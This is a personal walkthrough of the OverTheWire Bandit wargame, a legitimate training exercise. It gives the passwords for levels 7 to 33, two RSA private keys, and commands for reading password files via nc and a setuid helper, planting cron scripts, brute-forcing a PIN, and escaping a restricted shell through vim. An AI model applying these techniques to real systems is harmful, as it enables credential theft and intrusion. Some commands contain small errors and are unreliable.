# Bandit | Over The Wire - Wargames

[Bandit | Over The Wire - Wargames](https://overthewire.org/wargames/bandit/)

## lvl 7 -> 8 
    TESKZC0XvTetK0S9xNwm25STk5iWrBvP
## lvl 11 -> 12         

    JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv


    find . -name "*.txt" -exec -wc -l 

## lvl 12 -> 13 
    psw = wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

    xxd -r to reverse hexdump to bin
    gzip -d file.gz -> bzip2 -> tar -xfv file -> cat textfile

use comaand file to understand which is the decompression algo to use

## lvl 13 -> 14

    ssh -p 2220 -i ssh.key bandit14@overthe...

## lvl 14 -> 15
send a file to host:port

    nc -N localhost 30000 < /etc/bandit_pass/bandit14

    pwd = jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

## lvl 15 -> 16
to create a ssl connection 
openssl s_client -connect localhost:30001

pwd = JQttfApK4SeyHwDlI9SXGR50qclOAil1

## lvl 16 -> 17
scan ports 

    nmap -T4 -sV -p 31000-32000

    openssl s_client -connect localhost:31790

for creating file use `nano`

    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
    imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
    Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
    DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
    JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
    x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
    KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
    J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
    d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
    YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
    vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
    +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
    8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
    SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
    HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
    SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
    R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
    Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
    R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
    L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
    blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
    YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
    77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
    dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
    vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
    -----END RSA PRIVATE KEY-----

change permissions give read rights only

    chmod 700 ssh.private 

## lvl 17 -> 18

    pwd = hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

## lvl 18 -> 19
    ssh -p 2220 bandit18@bandit.labs.overthewire.org "cat ~/readme"

    pwd = awhqfNnAbc1naukrpqDYcF95h7HoMTrC

## lvl 19 -> 20
    ./bandit20-do cat /etc/bandit_pass/bandit20

    pwd = VxCazJaVykI6W36BkBU0mJTCM8rR95XT

## lvl 20 -> 21

    pwd = NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

nc netcat create server with listening on port portnumber

    echo "pwd" | nc -l -p portnumber 

reads data from portnumber and print the next password

    ./suconnect portnumer 


## lvl 21 -> 22
    pwd = WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

find cron job using 

    ls -la  /etc/cron.d/

read what it does (job for bandit22)
it says it run a script from 

    usr/bin/cronjob_bandit22.sh
read the file

    cat usr/bin/cronjob_bandit22.sh
it says outputs something to 

    /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

read it

    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv


## lvl 22 -> 23
    pwd = QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

find cronojob file from /etx/cron.d/ for bandit23
read the script from /usr/

    echo I am user bandit23 | md5sum | cut -d ' ' -f 1
    cat /tmp/8ca319486bfbbc3663ea0fbe81326349

## bandit 23 -> 24

    pwd = VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

read the cron.d file and find the folder where we need copy the script

    /etc/cron.d/
    /usr/bin/conjob_... .sh

    /var/spool/bandit24/foo

create a temp dir using 

    mktemp -d

create a bash script

    !#/bin/bash

    mkdir -p /tmp/THIS_FOLDER/$(cat /etc/bandit_pass/bandit24)

change permissions of the folder, of the script.sh

    chmod 777 folder
    chmod +rx script.sh
    cp script.sh /var/spool/bandit24/foo/script.sh

wait for a minute

## lvl 24 -> 25

    pwd = p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

~~~bash
    #!/bin/bash

    for i in {0000..9999}; do 
        output=$(echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}" | nc localhost 30002)
        echo $output $i
        if [[ "$output" != *"Try again"* ]];
        then echo "$output"
        fi
    done;
~~~
~~~sh
    #!/bin/bash

    for i in {0000..5000}; do 
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}" >> output1.txt
    done;

    cat output.txt | nc localhost 30002
~~~
~~~sh
    #!/bin/bash

    for i in {5001..9999}; do 
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}" >> output2.txt
    done;

    cat output.txt | nc localhost 30002
~~~

    chmod +x script.sh
    cat output1.txt | nc localhost 30002 > results1.txt
    cat results1.txt | grep -v "Wrong"

## lvl 25 -> 26

    pwd = c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
    pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
    /5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
    xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
    1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
    3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
    qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
    il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
    e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
    Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
    zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
    c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
    wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
    tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
    2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
    i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
    6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
    pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
    JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
    JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
    1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
    ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
    euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
    /Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
    IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
    -----END RSA PRIVATE KEY-----

copy the ssh key on your machine and login with key. first reduce the shell window size to make it very small which will make `more` enter in interactive mode, from which pressing `v` we can enter in vim. then set shell to bash, `:set shell=/bin/bash` and from here command `:shell` let us enter in bash shell. 

    cat /etc/bandit_pass/bandit26

c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

# lvl 26 -> 27

    pwd = YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS

    ./bandit27-do cat /etc/bandit_pass/bandit27

# lvl 27 -> 28

    pwd = AVanL161y9rsbcJIsFHuw35rjaOM19nR

    git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo

# lvl 28 -> 29

    pwd = tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S

    git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo

    git log // to view commits
    git checkout commit_hash
    cat README


# lvl 29 -> 30

    pwd = xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

    git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo 
    git log
    git branch -r // list remote branches
    git checkout origin/dev



# lvl 30 -> 31

    pwd = OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt

    git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo

    git tag -l

    git show <tag> // shows tags msg

# lvl 31 -> 32

    pwd = rmCBvG56y58BXzv98yZGdO7ATVL5dW8y

    git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
    create file called key.txt with "May I come in?"
    git add -f key.txt
    git commit -m "something"
    git push

# lvl 32 -> 33

    pwd = odHo63fHiFqcWWJG9rLiLDtPm45KzUKy

    $0 -> to exit uppercase shell
    $0 is the variable for reserved for the shell
    whoami shows that shell is running as bandit33
    so we can simply read the content of bandit33 password with cat /etc/bandit_pass/bandit33


